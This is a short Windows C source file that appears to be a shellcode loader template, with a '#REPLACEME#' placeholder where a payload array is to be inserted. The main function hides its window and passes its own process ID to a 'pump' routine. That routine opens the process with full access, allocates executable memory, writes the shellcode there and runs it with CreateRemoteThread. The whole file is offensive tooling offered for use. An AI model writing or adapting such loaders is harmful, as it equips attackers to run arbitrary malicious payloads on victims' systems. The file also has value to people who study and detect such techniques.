#define WINVER 0x0501

#include<windows.h>

#REPLACEME#

void pump(DWORD);

int main(int argc, char *argv[])
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi= {0};
	int processID = GetCurrentProcessId();
	pump(processID);
	while(1) {Sleep(50000);}
	return 0;
}


void pump(DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;

	if(!dwProcessID) {
		exit(0);
	}
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		exit(0);
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(sc)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		exit(0);
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, sc, sizeof(sc), NULL)) {
		exit(0);
	}
	CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
	CloseHandle(hProc);
}
